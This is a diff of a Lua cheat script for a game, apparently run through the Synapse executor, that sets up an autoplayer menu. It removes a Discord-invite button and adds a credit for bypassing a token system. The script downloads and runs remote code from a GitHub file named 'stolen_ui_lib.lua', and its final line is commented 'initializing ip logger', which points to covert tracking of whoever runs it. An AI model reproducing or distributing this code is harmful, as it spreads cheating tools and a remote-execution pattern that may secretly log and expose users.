@@ -3,11 +3,6 @@ Hi if you see this weird stuff like " -- { " its just simple embedding
               (since I code in Synapse)
 ]]
 
--- Varibles = {
-local Discord = "https://discord.gg/QdaJDDvRHN"
-local Notify = function(Title,Text,Duration)game:GetService'StarterGui':SetCore("SendNotification",{Title=Title,Text=Text,Duration=Duration or 1})end
--- }
-
 -- {
 
 local uwuware = loadstring(game:HttpGet'https://raw.githubusercontent.com/OPENCUP/random-texts/main/stolen_ui_lib.lua')()
@@ -19,34 +14,12 @@ Window:AddToggle{text = "Toggle autoplayer", flag = "AP" }
 
 -- Buttons = {
 Window:AddButton{text = "Destroy Gui", callback = function()pcall(function()game:GetService'CoreGui'.ScreenGui:Destroy()end)end}
-Window:AddButton{text = "Copy discord invite",
-callback=function()
-   if setclipboard then 
-      Notify("Success","Discord invite is in your clipboard")
-      setclipboard(Discord)
-   else
-      Notify("","Exploit doesn't support 'setclipboard', see invite in F9 menu")
-      print("\n\n== DISCORD INVITE ==\n"..Discord.."\n====================")
-   end
-   (syn.request or http_request or function()end){
-        Url = 'http://127.0.0.1:6463/rpc?v=1',
-        Method = 'POST',
-        Headers = {
-            ['Content-Type'] = 'application/json',
-            Origin = 'https://discord.com'
-        },
-        Body = game:GetService'HttpService':JSONEncode{
-            cmd = 'INVITE_BROWSER',
-            nonce = game:GetService'HttpService':GenerateGUID(false),
-            args = {code = 'QdaJDDvRHN'}
-        }
-    }
-end}
 -- }
 
 -- Labels = {
 Window:AddLabel{text = "AP by stavratum#6591"}
 Window:AddLabel{text = "UI and configs by cup#7282"}
+Window:AddLabel{text = "Token system bypassed by 0_Void#8895"}
 -- }
 
 uwuware:Init()  --<< initializing ip logger
